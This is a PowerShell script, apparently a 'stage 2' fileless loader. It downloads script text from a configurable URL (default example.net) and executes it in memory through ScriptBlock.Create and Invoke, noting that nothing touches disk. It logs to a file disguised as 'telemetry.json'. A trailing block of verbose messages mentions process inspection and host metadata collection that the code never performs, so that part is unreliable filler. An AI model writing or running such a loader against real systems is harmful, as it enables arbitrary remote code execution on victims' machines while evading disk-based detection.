<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://example.net/stage2.ps1',
    [string]$LogPath = "$env:TEMP\telemetry.json",
    [int]$RequestTimeout = 16
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 16
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $RemoteScript = Get-StageScriptText -SourceUrl $Stage2Url -TimeoutSec $RequestTimeout
    $OperationResult = Invoke-Stage2Script -ScriptBody $RemoteScript
    Write-Verbose "Stage result: $($OperationResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $Stage2Url
    ScriptLength = $RemoteScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Inspecting process list"
Write-Verbose "Reading configuration values"
Write-Verbose "Applying operation timeout"
Write-Verbose "Starting workflow"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
Write-Verbose "Retry budget remaining"
Write-Verbose "Stage handoff finished"
Write-Verbose "Exporting operation report"
$StageMarker = "stage-6"
